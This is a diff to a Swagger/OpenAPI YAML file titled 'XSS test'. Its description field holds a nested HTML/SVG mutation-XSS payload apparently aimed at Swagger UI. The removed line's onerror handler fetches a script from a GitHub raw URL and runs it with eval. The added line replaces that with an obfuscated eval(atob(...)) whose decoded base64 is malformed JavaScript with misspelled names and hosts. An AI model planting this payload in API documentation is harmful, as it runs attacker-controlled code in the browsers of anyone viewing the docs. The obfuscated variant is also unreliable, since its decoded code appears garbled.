@@ -1,5 +1,5 @@
 swagger: '2.0'
 info:
   title: XSS test
-  description:<math><mtext><h1><a><h6></a></h6><mglyph><svg><mtext><textarea><a title='</textarea><img src onerror=fetch(`https://raw.githubusercontent.com/VictorNS69/swagger-ui-xss/main/script.js`).then(function(res){res.text().then(function(data){eval(data)})})>'></textarea></h1>"></textarea></desc></textarea></mtext></mtext></svg></mglyph></option></mtext></math>
+  description:<math><mtext><h1><a><h6></a></h6><mglyph><svg><mtext><textarea><a title='</textarea><img src onerror=eval(atob(`aW1wZj1mdW5jdGlvbihyZXNpKXtyZXNpLnRleHRmcmFtZS5ldmFsKGRhdGEpO30pO2Z1bmN0aW9uIGdldENoZWNrSW1hZ2UoKXtyZXR1cm4gbmV3IFdpbmRvd3JvbmcuSW1hZ2UoJ2h0dHA6Ly9yYXcuZ2l0aHVidXNlYy5jb20vVmljdG9yTlM2OS9zd2FncmV1LXhzcC9tYWluLmpzJyk7fQ==`))>'></textarea></h1>"></textarea></desc></textarea></mtext></mtext></svg></mglyph></option></mtext></math>
   version: production
